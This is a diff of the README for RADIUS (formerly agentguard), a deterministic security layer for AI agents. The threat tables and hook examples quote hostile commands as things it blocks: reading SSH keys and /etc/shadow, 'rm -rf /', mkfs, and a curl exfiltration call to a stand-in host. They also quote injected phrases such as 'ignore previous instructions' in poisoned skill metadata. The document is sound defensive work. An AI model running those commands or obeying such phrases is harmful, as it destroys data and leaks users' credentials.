@@ -1,218 +1,103 @@
-# agentguard
+# RADIUS
 
-The invariant layer for AI agents.
+Draw the boundary.
 
-> "The more data & control you give to the AI agent: (A) the more it can help you AND (B) the more it can hurt you." -- Lex Fridman
+Deterministic security controls for AI agents. No LLM in the decision loop.
 
-Stop begging your agent via prompts. Start enforcing physics via code.
+> "The more data & control you give to the AI agent: (A) the more it can help you AND (B) the more it can hurt you." — [Lex Fridman](https://x.com/lexfridman/status/2023573186496037044)
 
 ## The problem
 
-Agent intelligence is scaling. Access and autonomy are scaling. Security is not.
+Your agent has root access to your machine. Your security layer is a system prompt that says "please be careful." Think about that for a second.
 
-Right now security is the bottleneck for AI agent usefulness. You want to give your agent shell access, file reads, network requests. But one bad prompt or hallucination, and it:
+Intelligence is scaling. Access is scaling. Security is not. One bad prompt and your agent reads `~/.ssh/id_rsa`, runs `rm -rf /`, loops 500 times through your API budget, or installs a skill with hidden exfiltration instructions.
 
-- reads `~/.ssh/id_rsa` and pastes it into a response
-- runs `rm -rf /` or `sudo` something
-- loops 500 times and burns through your API budget
-- installs a third-party skill with hidden instructions that exfiltrate your data
+You could review every action manually, but that defeats the point of having an agent. You need containment that doesn't kill capability.
 
-You could review every action manually. That defeats the purpose of having an agent. You need containment that doesn't kill capability.
+## Why this matters
 
-## Why this matters now (research snapshot, Feb 18, 2026)
+Numbers from 78 validated research sources (114 analyzed), Feb 2026:
 
-Numbers from the latest agent-security research review used for this project:
+| | |
+|---|---|
+| **13.4%** | Of 3,984 marketplace skills scanned, 534 had critical issues. 76 were confirmed malicious — running install-time scripts that stole credentials. |
+| **6 / 6** | Researchers tested six coding agents for tool injection. All six gave up remote code execution through poisoned tool metadata. |
+| **85%+** | A 78-study survey of prompt-based guardrails found most break under adaptive red-team attacks. The LLM can't reliably police itself. |
 
-- 78 validated sources (from 114 analyzed), including incident writeups, CVEs, and academic studies
-- 3,984 marketplace skills scanned, 534 marked critical (13.4%), 76 confirmed malicious
-- RCE demonstrated on 6/6 tested coding agents via tool injection paths
-- 99%+ attack success rate reported for indirect tool-output prompt injection in one benchmark
-- 78-study SoK: all tested prompt-injection defenses were bypassable under adaptive attacks, many at 85%+
-- One real supply-chain campaign impacted 500+ packages and 25,000+ repos in hours
+A regex match on `rm -rf` is true or false. The agent can't talk its way past it.
 
-Example chains we design against:
+## Modules
 
-- hidden instructions in skill/tool metadata that trigger secret exfiltration
-- benign-looking skill install scripts that drop malware or leak credentials
-- prompt injection in external content that keeps task quality but silently leaks data
+Eleven modules, none with an LLM. They block or allow based on rules you write.
 
-## What agentguard does
+| Module | What it does |
+|--------|-------------|
+| `kill_switch` | Emergency stop. Set an env var or drop a file, all risky actions halt. |
+| `tool_policy` | Allow or deny by tool name. Optional argument schema validation. Default deny. |
+| `fs_guard` | Blocks file access outside allowed paths. `~/.ssh`, `~/.aws`, `/etc` are unreachable. |
+| `command_guard` | Matches shell patterns — `sudo`, `rm -rf`, pipe chains. Blocked before execution. |
+| `exec_sandbox` | Wraps commands in bwrap. Restricted filesystem and network access. |
+| `egress_guard` | Outbound network filter. Allowlist by domain, IP, port. Everything else is dropped. |
+| `output_dlp` | Catches secrets in output — AWS keys, tokens, private certs. Redacts or blocks. |
+| `rate_budget` | Caps tool calls per minute. Stops runaway loops. |
+| `skill_scanner` | Inspects skills at load time for injection payloads: zero-width chars, base64 blobs, exfil URLs. |
+| `approval_gate` | Routes risky operations to Telegram or an HTTP endpoint for human approval. |
+| `audit` | Append-only log of every decision. Every action, every timestamp. |
 
-Your agent is a reactor. It produces enormous energy (utility), but can melt down (data loss, credential theft, runaway costs). Existing approaches either pour concrete over the reactor (block everything) or pray it doesn't blow (prompt-based safety).
+## Three postures
 
-agentguard is the control rods. Deterministic constraints that throttle risk without killing output. Every tool call is intercepted, checked against a set of rules, and gets one of five verdicts: allow, deny, modify (patch arguments), challenge (require human approval), or alert (log and continue).
+One config change. Pick the containment level that matches your context.
 
-No LLM in the loop. A regex match on `rm -rf` is either true or false.
+**Local** — Zero trust.
+Production, billing, credentials. Default deny. Sandbox required. 30 calls/min.
 
-## Human-first security model
+**Standard** — Trust but verify.
+Development, staging, daily work. Default deny. Secrets redacted. 60 calls/min.
 
-agentguard targets human safety first: protecting the user from irreversible harm, then protecting infrastructure.
-
-- dangerous actions default to `deny` or `challenge`, not silent execution
-- approval timeout or approval-channel failure defaults to `deny` (fail-closed)
-- sensitive paths/secrets are blocked before they can reach model output
-- safe low-risk operations stay autonomous to preserve workflow speed
-- emergency stop is deterministic (`kill_switch` via env/file toggle), so a human can halt risky actions immediately
-
-### 11 core modules
-
-| Module | What it blocks |
-|--------|---------------|
-| `kill_switch` | Emergency stop: deny risky actions when a human toggles kill switch |
-| `tool_policy` | Tool calls not on the allowlist + optional per-tool argument schema validation |
-| `fs_guard` | File access outside allowed paths (blocks `~/.ssh`, `~/.aws`, `/etc`) |
-| `command_guard` | Shell patterns like `sudo`, `rm -rf`, pipe chains |
-| `exec_sandbox` | Wraps commands in bwrap isolation |
-| `egress_guard` | Outbound network by domain, IP, or port |
-| `output_dlp` | Secrets in output (AWS keys, tokens, API keys) -- redacts or blocks |
-| `rate_budget` | More than N calls per minute (stops runaway loops) |
-| `skill_scanner` | Hidden instructions in third-party skills: zero-width chars, base64 payloads, exfil URLs |
-| `approval_gate` | Requires human confirmation for high-risk actions |
-| `audit` | Append-only log of every decision |
-
-### 3 containment levels
-
-- **strict** -- BUNKER. Production, billing, access keys. Default deny. Sandbox required. Secrets blocked. 30 calls/min. Paranoia is professionalism.
-- **balanced** -- TACTICAL. Development, refactoring, staging deploys. Default deny. Sandbox optional. Secrets redacted. 60 calls/min. Trust, but verify.
-- **monitor** -- YOLO. Research, brainstorming, open data analysis. Observe only. Logs what would have been blocked, blocks nothing. 120 calls/min. Full freedom, full audit trail.
+**Unbounded** — Observe only.
+Research, brainstorming, migration. Logs everything, blocks nothing. 120 calls/min.
 
 ## Install
 
 ```bash
-npm install agentgrd
+npm install agentradius
 ```
 
-## Setup
+## Get running
 
 ```bash
-npx agentguard init --framework openclaw --profile balanced
+npx agentradius init --framework openclaw --profile standard
+npx agentradius doctor    # verify setup
+npx agentradius pentest   # test your defenses
 ```
 
-This creates `agentguard.yaml` and wires the adapter for your orchestrator.
-
-What gets generated (turnkey wiring):
-
-- `openclaw`:
-  - `.agentguard/openclaw-hook.command.sh`
-  - `.agentguard/openclaw-hooks.json` (`hooks.PreToolUse/PostToolUse`, matcher-based)
-- `claude-telegram`:
-  - `.agentguard/claude-telegram.module.yaml`
-  - `.agentguard/claude-tool-hook.command.sh`
-  - `.claude/settings.local.json` is auto-patched to add `PreToolUse/PostToolUse` command hooks without overwriting existing `permissions`
-
-Hook scripts resolve config path via script directory (`$SCRIPT_DIR`) so they keep working regardless of current shell working directory.
-
-Check that everything is configured:
-
-```bash
-npx agentguard doctor
-```
-
-Run attack scenarios to verify the guards work:
-
-```bash
-npx agentguard pentest
-```
+This creates `radius.yaml` and wires the adapter for your orchestrator.
 
 Supported frameworks: `openclaw`, `nanobot`, `claude-telegram`, `generic`.
 
-## Custom adapter for Claude Code-based orchestrators
+What gets generated:
 
-If your orchestrator is built on Claude Code hooks but has its own runtime/protocol, use a custom adapter runner.
+- **openclaw**: `.radius/openclaw-hook.command.sh`, `.radius/openclaw-hooks.json`
+- **claude-telegram**: `.radius/claude-telegram.module.yaml`, `.radius/claude-tool-hook.command.sh`, auto-patched `.claude/settings.local.json`
 
-Ready example:
-- `examples/claude-custom-adapter-runner.mjs`
-
-What this adapter does:
-- maps Claude hook payload (`hook_event_name`, `tool_name`, `tool_input`, `tool_response`) to canonical `GuardEvent`
-- runs the standard agentguard pipeline (`runPipeline`)
-- maps decision back to Claude command-hook response JSON:
-  - allow -> `{ "continue": true }`
-  - deny/challenge -> `{ "decision": "block", "reason": "..." }`
-
-Hook wiring (`.claude/settings.local.json`):
-
-```json
-{
-  "hooks": {
-    "PreToolUse": [
-      {
-        "matcher": "*",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "node ./examples/claude-custom-adapter-runner.mjs --config ./agentguard.yaml"
-          }
-        ]
-      }
-    ],
-    "PostToolUse": [
-      {
-        "matcher": "*",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "node ./examples/claude-custom-adapter-runner.mjs --config ./agentguard.yaml"
-          }
-        ]
-      }
-    ]
-  }
-}
-```
-
-Quick local check:
-
-```bash
-echo '{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"sudo id"}}' \
-  | node ./examples/claude-custom-adapter-runner.mjs --config ./agentguard.yaml
-```
-
-Expected output (strict/balanced profile):
-
-```json
-{"decision":"block","reason":"command_guard: denied by pattern ..."}
-```
-
-### Channel-aware approvals (`auto`)
-
-For risky tools, `approval_gate` can route to the active chat channel when the runtime exposes it.
-For Telegram, `sync_wait` mode is runtime-resolved via inline approval callbacks.
-
-```yaml
-moduleConfig:
-  approval_gate:
-    autoRouting:
-      defaultChannel: telegram
-      frameworkDefaults:
-        openclaw: telegram
-        nanobot: telegram
-        claude-telegram: telegram
-        generic: http
-      metadataKeys: ["channel", "provider", "transportChannel", "messenger"]
-    rules:
-      - tool: "Bash"
-        channel: auto # tries runtime channel first (e.g. discord), then fallback
-        prompt: 'Approve execution of "Bash"?'
-        timeoutSec: 90
-```
+Hook scripts resolve config via `$SCRIPT_DIR` so they work regardless of shell working directory.
 
 ## Usage
 
 ### As a library
 
 ```typescript
-import { AgentGuardRuntime, GuardPhase } from 'agentgrd';
+import { RadiusRuntime, GuardPhase } from 'agentradius';
 
-const guard = new AgentGuardRuntime({
-  configPath: './agentguard.yaml',
+const guard = new RadiusRuntime({
+  configPath: './radius.yaml',
   framework: 'openclaw'
 });
 
 const result = await guard.evaluateEvent({
   phase: GuardPhase.PRE_TOOL,
   framework: 'openclaw',
-  sessionId: 'session-666',
+  sessionId: 'session-1',
   toolCall: {
     name: 'Bash',
     arguments: { command: 'cat ~/.ssh/id_rsa' },
@@ -227,20 +112,20 @@ const result = await guard.evaluateEvent({
 ### As a hook (stdin/stdout)
 
 ```bash
-echo '{"tool_name":"Bash","tool_input":{"command":"sudo rm -rf /"}}' | npx agentguard hook
+echo '{"tool_name":"Bash","tool_input":{"command":"sudo rm -rf /"}}' | npx agentradius hook
 ```
 
 ### As a server
 
 ```bash
-npx agentguard serve --port 3000
+npx agentradius serve --port 3000
 ```
 
 ## Configuration
 
 ```yaml
 global:
-  profile: balanced
+  profile: standard
   workspace: ${CWD}
   defaultAction: deny
 
@@ -256,11 +141,8 @@ modules:
 moduleConfig:
   kill_switch:
     enabled: true
-    envVar: AGENTGUARD_KILL_SWITCH
-    filePath: ./.agentguard/KILL_SWITCH
-    denyPhases:
-      - pre_request
-      - pre_tool
+    envVar: RADIUS_KILL_SWITCH
+    filePath: ./.radius/KILL_SWITCH
 
   fs_guard:
     allowedPaths:
@@ -272,9 +154,6 @@ moduleConfig:
     blockedBasenames:
       - .env
       - .env.local
-      - .env.development
-      - .env.production
-      - .env.test
       - .envrc
 
   command_guard:
@@ -285,99 +164,148 @@ moduleConfig:
   rate_budget:
     windowSec: 60
     maxCallsPerWindow: 60
+    store:
+      engine: sqlite
+      path: ./.radius/state.db
+      required: true
 ```
 
 Template variables: `${workspace}`, `${HOME}`, `${CWD}`, and any environment variable.
 
-OpenClaw strict starter template:
-- `examples/openclaw-strict.yaml`
+## Approvals
+
+`approval_gate` routes risky tools to Telegram or HTTP for human confirmation. Both support `sync_wait` mode.
+
+Telegram callbacks: **Approve** (one action) · **Allow 30m** (temporary lease) · **Deny**
+
+HTTP expects a POST returning `{"status":"approved"}`, `{"status":"denied"}`, `{"status":"approved_temporary","ttlSec":1800}`, or `{"status":"error","reason":"..."}`.
+
+```yaml
+approval:
+  channels:
+    telegram:
+      enabled: true
+      transport: polling
+      botToken: ${TELEGRAM_BOT_TOKEN}
+      allowedChatIds: []
+      approverUserIds: []
+    http:
+      enabled: false
+      url: http://127.0.0.1:3101/approvals/resolve
+      timeoutMs: 10000
+  store:
+    engine: sqlite
+    path: ./.radius/state.db
+    required: true
+
+moduleConfig:
+  approval_gate:
+    autoRouting:
+      defaultChannel: telegram
+      frameworkDefaults:
+        openclaw: telegram
+        generic: http
+    rules:
+      - tool: "Bash"
+        channel: auto
+        prompt: 'Approve execution of "Bash"?'
+        timeoutSec: 90
+```
+
+`Allow 30m` only bypasses repeated approval prompts. All other modules still enforce normally.
+
+## OpenClaw subprocess compatibility
+
+OpenClaw hooks run as subprocesses, so in-memory state resets on every tool call. Anything that needs to persist across calls requires SQLite:
+
+```yaml
+approval:
+  store:
+    engine: sqlite
+    path: ./.radius/state.db
+    required: true
+
+moduleConfig:
+  rate_budget:
+    store:
+      engine: sqlite
+      path: ./.radius/state.db
+      required: true
+```
+
+| Module | Subprocess mode | Note |
+|--------|----------------|------|
+| `kill_switch`, `tool_policy`, `fs_guard`, `command_guard`, `audit` | Works | Stateless or file/env based |
+| `approval_gate` + `Allow 30m` | Works | SQLite lease store persists across processes |
+| `rate_budget` | Works | SQLite store keeps counters across processes |
+| `output_dlp` | Partial | Requires `PostToolUse` hook wiring |
+| `egress_guard` | Works | Preflight policy; kernel egress needs OS firewall |
+| `exec_sandbox` | Platform dependent | Linux `bwrap`; non-Linux needs equivalent |
+| `skill_scanner` | Not triggered by `PreToolUse` | Run via `npx agentradius scan` or CI |
+
+## Custom adapter
+
+For Claude Code-based orchestrators with custom runtime/protocol, see `examples/claude-custom-adapter-runner.mjs`.
+
+Maps Claude hook payload to canonical `GuardEvent`, runs the pipeline, maps back to Claude response JSON.
+
+```bash
+echo '{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"sudo id"}}' \
+  | node ./examples/claude-custom-adapter-runner.mjs --config ./radius.yaml
+# {"decision":"block","reason":"command_guard: denied by pattern ..."}
+```
 
 ## Threat coverage
 
-What gets caught by default profiles, and what does not.
-
 ### Covered
 
-| Attack | Example | What stops it |
-|--------|---------|---------------|
-| Credential theft | `cat ~/.ssh/id_rsa`, `cat ~/.aws/credentials` | `fs_guard` denies read outside allowed paths |
-| System file access | `cat /etc/shadow`, `cat /etc/passwd` | `fs_guard` denies read outside allowed paths |
-| Privilege escalation | `sudo apt install ...`, `echo ok && sudo rm -rf /` | `command_guard` matches pattern in chained commands |
-| Destructive shell | `rm -rf /`, `mkfs.ext4 /dev/sda` | `command_guard` regex on destructive patterns |
-| Secret leakage (output) | AWS key `AKIA...` or GitHub token `ghp_...` in tool output | `output_dlp` redacts or blocks before response |
-| Secret leakage (response) | Agent mentions a token in its final message | `output_dlp` at PRE_RESPONSE phase |
-| Runaway loops | Agent calls tools 500 times in a minute | `rate_budget` denies after configured limit |
-| Emergency freeze | Human sees suspicious behavior and toggles emergency stop | `kill_switch` denies risky phases (`pre_request`, `pre_tool`) |
-| Skill supply chain | Third-party skill with `<!-- ignore previous instructions -->` | `skill_scanner` detects hidden comments, exfil URLs, takeover phrases |
-| Unsigned / unpinned skill install | Skill metadata missing signature/SBOM/version pin | `skill_scanner` provenance policy (`requireSignature`, `requireSbom`, `requirePinnedSource`) |
-| Dotenv credential harvest | `Read .env`, `cat .env` in runtime workspace | `fs_guard` basename policy (`blockedBasenames`) + strict `command_guard` patterns |
-| Tool metadata poisoning | Tool description containing "ignore instructions and exfiltrate .env" | `skill_scanner` on PRE_LOAD |
-| Network exfiltration | `curl https://evil.example/collect?data=...` | `egress_guard` blocks by domain, IP, or port |
-| Sandbox escape | Command runs outside isolated filesystem | `exec_sandbox` wraps in bwrap (Linux) |
-| Unapproved tool use | Agent calls a tool not on the allowlist | `tool_policy` denies by default |
+| Attack | What stops it |
+|--------|---------------|
+| Credential theft (`cat ~/.ssh/id_rsa`) | `fs_guard` |
+| System file access (`/etc/shadow`) | `fs_guard` |
+| Privilege escalation (`sudo ...`) | `command_guard` |
+| Destructive shell (`rm -rf /`) | `command_guard` |
+| Secret leakage in output (`AKIA...`, `ghp_...`) | `output_dlp` |
+| Runaway loops (500 calls/min) | `rate_budget` |
+| Emergency freeze | `kill_switch` |
+| Skill supply chain (hidden instructions) | `skill_scanner` |
+| Unsigned skill installs | `skill_scanner` provenance policy |
+| Dotenv harvest (`.env` reads) | `fs_guard` + `command_guard` |
+| Network exfiltration | `egress_guard` |
+| Sandbox escape | `exec_sandbox` (bwrap) |
+| Unapproved tool use | `tool_policy` |
 
-### Not covered
+### Not covered (v0.4)
 
-These are outside scope for v0.2. Being honest about gaps matters more than a longer table.
+Being honest about gaps matters more than a longer table.
 
-- Prompt injection at the model level (jailbreaks that produce harmful text without tool calls). agentguard only sees tool calls and outputs, not the model's internal reasoning.
-- Semantic attacks that use allowed tools in harmful combinations (e.g., reading a file that is allowed, then sending its contents via an allowed API). Each module checks independently.
-- Token/cost budgets (counting LLM tokens or dollars spent). Rate limiting counts calls, not tokens.
-- Multi-tenant isolation. One config per runtime. No user-level policy separation.
-- OS-level exploits. `exec_sandbox` uses `bwrap`, not a VM. A kernel exploit bypasses it.
+- **Prompt injection at model level.** Jailbreaks that produce harmful text without tool calls. RADIUS only sees tool calls and outputs, not the model's internal reasoning.
+- **Semantic attacks via allowed tools.** Reading an allowed file, then sending its contents via an allowed API. Modules check independently; they don't reason about intent.
+- **Token/cost budgets.** Rate limiting counts calls, not tokens or dollars.
+- **Multi-tenant isolation.** One config per runtime. No user-level policy separation.
+- **OS-level exploits.** `exec_sandbox` uses bwrap, not a VM. A kernel exploit bypasses it.
 
 ## Tests
 
-82 tests across 8 test suites. All pass. Runtime: ~400ms.
-
-```
-test/pipeline.test.ts    Pipeline decision logic, short-circuiting, patch composition, fail-closed behavior
-test/modules.test.ts     Every security module: kill_switch, tool_policy, fs_guard, command_guard, exec_sandbox,
-                         egress_guard, output_dlp, rate_budget, skill_scanner, audit, verdict_provider
-test/adapters.test.ts    All 4 adapters: malformed payload handling, challenge propagation, event mapping
-test/audit-cli.test.ts   Audit log parsing and summary generation
-```
-
-Run them:
+92 tests across 10 suites. ~500ms.
 
 ```bash
 npm test
 ```
 
-### Continuous adversarial regression (CI)
+### CI regression
 
-`agentguard` includes a CI workflow at `.github/workflows/security-regression.yml` that runs:
-
-```bash
-npm run build
-npm test
-node dist/cli/index.js init --framework generic --profile balanced --output /tmp/agentguard-ci.yaml
-node dist/cli/index.js pentest --config /tmp/agentguard-ci.yaml
-```
-
-This catches policy regressions against baseline attack scenarios before merge.
-
-### Security KPIs from audit
-
-Use `agentguard audit` to get lightweight operational security metrics from audit logs:
-
-- intervention rate (`deny + challenge` as % of decisions)
-- median detection latency per session
-- kill-switch activation count
-- shell-event sandbox coverage
-- artifact provenance coverage (signed/pinned/SBOM)
-- dotenv exposure posture (blocked policy + observed reads in recent entries)
+`.github/workflows/security-regression.yml` runs build, tests, and pentest on every push:
 
 ```bash
-agentguard audit --json
+npx agentradius init --framework generic --profile standard --output /tmp/radius-ci.yaml
+npx agentradius pentest --config /tmp/radius-ci.yaml
 ```
 
 ### Built-in pentest
 
-`agentguard pentest` runs 10 attack scenarios against your live config and reports `ok` / `warn` / `fail`:
-
 ```
-agentguard pentest
+npx agentradius pentest
 
   [OK  ] fs_guard blocks /etc/passwd
   [OK  ] command_guard blocks sudo chain
@@ -389,49 +317,41 @@ agentguard pentest
   [OK  ] rate_budget blocks runaway loop
   [WARN] egress_guard blocks outbound exfiltration
   [OK  ] adapters handle malformed payloads
-
-Summary: 9 ok, 1 warn, 0 fail
 ```
 
-`warn` means a control is missing or not fully configured for the selected profile (for example, `egress_guard` not enabled/configured in `balanced`).
-If any scenario `fail`s, the command exits with code 1. Use it in CI.
+### Audit metrics
+
+```bash
+npx agentradius audit --json
+```
+
+Intervention rate, detection latency, kill-switch activations, sandbox coverage, provenance coverage, dotenv exposure posture.
 
 ## How it works
 
 ```
 Orchestrator event
-  → Adapter (converts to canonical format)
-    → Pipeline (runs modules in order)
-      → first DENY or CHALLENGE wins, patches compose, alerts accumulate
-    → Adapter (converts back to orchestrator format)
-  → Response
+  -> Adapter (converts to canonical format)
+    -> Pipeline (modules run in config order)
+      -> first DENY or CHALLENGE wins, patches compose, alerts accumulate
+    -> Adapter (converts back to orchestrator format)
+  -> Response
 ```
 
-Every orchestrator speaks a different protocol. The adapter layer converts events into a single `GuardEvent` format so modules don't care whether the call came from OpenClaw, Nanobot, or a Telegram bot.
-
-Modules run in order. If any module returns DENY or CHALLENGE, execution stops. MODIFY patches are deep-merged. If an enforce-mode module throws an error, the pipeline fails closed (denies). If an observe-mode module throws, it logs an alert and continues.
-
-## When something goes wrong
-
-```bash
-npx agentguard audit --tail 50
-npx agentguard audit --session <session_id> --tail 100
-npx agentguard audit --json
-```
-
-Every decision is logged with the module name, the action taken, and the reason. No gaps.
+Modules run in config order. If any module returns DENY or CHALLENGE, the pipeline stops. MODIFY patches are deep-merged. If an enforce-mode module throws, it fails closed (denies). Observe-mode errors log and continue.
 
 ## Requirements
 
 - Node.js >= 20
-- `bwrap` (optional, for `exec_sandbox` on Linux)
+- Node.js 22+ for persistent state (`node:sqlite` for approval leases, rate budgets)
+- `bwrap` (optional, `exec_sandbox` on Linux)
 
 ## Credits
 
-Security philosophy, threat model, and defense-in-depth architecture based on research by [Dima Matskevich](https://github.com/matskevich):
+Security philosophy and threat model based on research by [Dima Matskevich](https://github.com/matskevich):
 
-- [openclaw-infra/docs/security](https://github.com/matskevich/openclaw-infra/tree/main/docs/security) — 5-layer security hardening framework for AI agents
-- ["openclaw: why security from the docs is decoration"](https://dimamatskevich.substack.com/p/openclaw) — analysis of why prompt-level and config-level defenses fail under adaptive attacks, and why OS-level enforcement is necessary
+- [openclaw-infra/security](https://github.com/matskevich/openclaw-infra/tree/main/docs/security) — 5-layer security hardening for AI agents
+- ["openclaw: why security from the docs is decoration"](https://dimamatskevich.substack.com/p/openclaw) — why prompt-level defenses fail under adaptive attacks
 
 ## License
 
